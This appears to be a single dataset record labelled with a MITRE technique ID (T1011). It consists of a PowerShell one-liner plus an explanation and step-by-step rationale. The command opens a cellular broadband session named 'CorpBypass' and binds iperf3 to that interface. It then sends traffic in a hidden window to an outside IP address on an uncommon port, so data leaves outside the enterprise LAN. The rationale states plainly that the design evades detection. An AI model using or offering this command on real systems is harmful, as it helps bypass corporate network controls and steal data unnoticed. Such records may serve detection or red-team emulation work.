command: netsh mbn connect interface="Cellular" connmode=name name="CorpBypass" | Out-Null; $cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList "-c 100.72.55.9 -p 53433 -B $ip -t 60"
explanation: Establishes a mobile broadband session and binds iperf3 to the Cellular interface, exfiltrating via cellular data instead of enterprise LAN (T1011).
rationale_steps: Initiate a mobile broadband connection to enable the cellular medium.
Resolve the cellular interface IP address.
Bind iperf3 to that IP on an uncommon port for data egress.
Execute hidden to reduce casual observation.
